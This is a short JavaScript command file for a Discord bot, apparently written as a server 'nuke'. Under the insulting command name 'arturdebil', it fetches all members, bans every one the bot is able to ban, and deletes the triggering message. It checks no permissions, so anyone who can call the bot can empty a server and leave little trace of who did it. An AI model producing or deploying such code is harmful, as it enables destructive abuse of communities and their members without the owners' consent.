const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {

    try {

        const members = await message.guild.members.fetch()
        members
            .filter(m => m.bannable)
            .forEach(m => m.ban())
        message.delete(1000);

    } catch(e) {

        console.log(e.stack);

    }
        
}

module.exports.help = {

    name: "arturdebil",
    desc: "Bans everyone."

}
